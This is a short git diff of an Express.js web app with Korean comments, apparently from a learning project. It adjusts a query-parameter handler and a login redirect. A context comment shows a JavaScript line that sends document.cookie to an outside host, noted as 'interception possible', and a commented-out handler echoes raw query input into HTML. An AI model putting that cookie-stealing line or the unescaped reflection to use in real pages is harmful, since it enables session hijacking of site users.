@@ -21,8 +21,11 @@ app.use(cookieParser());
 
 app.get('/',(req,res)=>{
 
-    let {msg}=req.query;
-        res.render('index')
+
+    let {msg:message}=req.query;
+    
+    console.log(message);
+    res.render('index')
     //res.send(`${msg} hello world<a href="/menu1">menu1</a><a href="/login?id=root&pw=root">로그인</a>`);
         /*
         body:{
@@ -48,7 +51,7 @@ app.get('/login',(req,res)=>{
         //location.href=`http://naver.com?${document.cookie}`가로채기 가능
     }else{
         //토큰 실패
-        res.redirect('.?msg=로그인실패');
+        res.redirect('/?msg=로그인실패');
     }
                         })
 
